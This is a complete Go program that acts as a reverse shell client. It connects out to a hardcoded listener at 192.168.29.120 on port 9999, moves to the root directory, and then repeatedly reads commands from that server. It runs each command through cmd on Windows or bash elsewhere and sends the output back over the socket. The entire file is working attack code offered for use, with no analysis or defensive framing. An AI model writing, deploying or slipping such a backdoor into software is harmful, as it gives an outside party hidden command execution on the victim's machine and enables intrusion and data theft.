package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const ipAddr = "192.168.29.120" // IP address of the socket server
const port = "9999"             // Port address of the socket server

// Function to execute a shell command.
// Returns the outpput of the command that is run.
func Execute(value string) string {
	name := "windows" // Default OS

	// Check for different OS runtimes.
	switch runtime.GOOS {
	case "windows":
		name = "cmd"
		value = "/C" + " " + value
	default:
		name = "/bin/bash"
		value = "-c" + " " + value
	}

	fmt.Println(name, value)

	tmp := strings.Split(value, " ")

	// The ellipsis (...) indicates that a slice or array should be "expanded" into individual arguments for the function.
	cmd := exec.Command(name, tmp...)
	output, err := cmd.Output()

	// Return Error message if err != nil
	if err != nil {
		return err.Error()
	}

	// Return output of the executed command
	return string(output)
}

func main() {

	// Tries to establish a TCP connection with the service hosted on {ipAddr}:{port}
	// Exits (panic) the program if it fails to establish a connection
	conn, err := net.Dial("tcp", ipAddr+":"+port)
	if err != nil {
		panic(err)
	}

	// Close the connection just before exiting the main function.
	defer conn.Close()

	// Changes the directory of the program to root ("/") directory
	os.Chdir("/")

	for {

		// Buffer to store the incoming data from the server.
		// Does not work with buff := []byte.
		// Exits the infinite loop if an error is encountered.
		buffer := make([]byte, 2048)
		_, err := conn.Read(buffer)
		if err != nil {
			fmt.Println(err)
			break
		}

		// Trim the leading and trailing null(\x00) values
		// as string length can be less than the buffer size of 2048 bytes.
		command := strings.Trim(string(buffer), "\x00")

		// Check for a change in directory.
		if strings.HasPrefix(command, "cd") {
			tmp := strings.Split(command, " ")
			os.Chdir(tmp[1])
			dir, _ := os.Getwd()
			conn.Write([]byte(dir))
			continue
		}

		// Exit the infinite loop if command is "exit".
		if command == "exit" {
			break
		}

		// Execute command
		output := Execute(command)

		// Write the output of the executed command to the connection.
		conn.Write([]byte(output))
	}

}
